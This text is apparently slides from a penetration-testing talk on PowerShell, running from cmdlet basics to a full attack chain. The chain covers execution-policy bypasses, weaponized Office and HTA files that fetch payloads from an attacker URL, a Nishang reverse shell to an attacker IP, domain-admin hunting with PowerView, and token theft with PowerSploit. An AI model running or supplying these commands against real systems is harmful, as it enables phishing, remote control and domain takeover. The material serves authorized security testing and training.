•Use with about_* to list help about a conceptual topic.
•Various parameters could be passed to Get-Help
Get-Help Get-Help–Full
Get-Help Get-Command -Examples
•A Cmdletis pronounced as “command let”.
•Cmdlets are task based compiled .Netclasses.
•Explore cmdlets
Get-Command –CommandTypeCmdlet
•Explore cmdlets based on a verb
Get-Command –Verb Get
•Get-Command also supports wildcards.
- PowerShell scripts have .ps1 extension.

•Execution Policy is present to stop a user from accidently running scripts.

•There are numerous ways to bypass it:
powershell.exe –ExecutionPolicybypass .\script.ps1
powershell.exe –EncodedCommand<>
powershell.exe –c <>
Read: 15 ways to bypass PowerShell execution policy https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy

•A simplest module is a PowerShell script with the extension .psm1
•Use Get-Module -ListAvailableto list modules.
•Use Import-Module <modulepath>to import a module.
•Use Get-Command –Module <Modulename> to list functions exported by a module.

•Lets consider a Pen Test scenario:
–The Goal of this Penetration Test is to get access to Domain Administrator. (Note that DA is just being used as an example, in an actual pen test you may like to discuss a better goal with your client.)
–Server side attacks have been largely unsuccessful.
–Metasploit payloads are being detected by Anti Virus and other countermeasures.

•Lets use Client Side attack scripts from Nishang (https://github.com/samratashok/nishang)
•The targets for Client Side Attacks mimic human targets –They open links and attachments emailed to them.

•Generating weaponizedMS Office Files
Out-Word -Payload "powershell.exe -ExecutionPolicyBypass -noprofile-noexit-c Get-Process“
Out-Word -PayloadURLhttp://yourwebserver.com/evil.ps1
Out-Excel -Payload "powershell.exe –EncodedCommand<>“

•Drive by download attacks
Out-HTA -PayloadURLhttp://192.168.254.1/powerpreter.psm1 -Arguments Check-VM
•More weaponizedfiles
Out-CHM
Out-Shortcut

•Now that we can run successful client side attacks, we may need shell level access for further attacks.
•PowerShell can be used to write shells as well.
•Shells in PowerShell can be used with exploits to get access to the target machine.

•Lets use a TCP reverse shell, Invoke-PowerShellTcp.ps1 from Nishang.
•It also has a one-line version.
•On Windows target:
Invoke-PowerShellTcp–IPAddress192.168.230.1 –Port 443
•Use Invoke-Encode from Nishang to encode Invoke-PowerShellTcpand use it with a Client Side Attack.

•We have an interactive PowerShell session on one of the machines on the target domain and various PowerShell tools can be used now.
•We can use Powerview(https://github.com/Veil-Framework/PowerTools/tree/master/PowerView) to enumerate the target domain.
•The goal is to find a machine where a Domain Admin is logged in.

•To find machines which have a domain admin logged in and the current user has access to that machine:
Invoke-UserHunter–CheckAccess

•To find machines which have SQL Server running and the current user has access to SQL Server:
Get-SqlServer-Escalate-CheckAccess
https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/Get-SqlServer-Escalate-CheckAccess.psm1

•Execute PowerShellcommands or SQL queries on the target instance:
Execute-Command-MSSQL –ComputerNamePFPTLAB-File –WindowsAuthentication
•In case the SQL Server service itself is running as DA, its game over.
•Otherwise:
•We can use the Domain Admin token on the target machine using Invoke-TokenManipulationand some PowerShell hackery:
Get-Process -id <DA process> | Invoke-TokenManipulationCreateProcesscmd.exe
Invoke-TokenManipulationis a part of Powersploit(https://github.com/mattifestation/PowerSploit)

•Log LogLog!
•Monitor and Analyze the logs.
•Understand flow/use of privileges and credentials in your environment.
•If a determined attacker can break into any system, a determined system administrator can catch any attacker as well.

### THE END ###














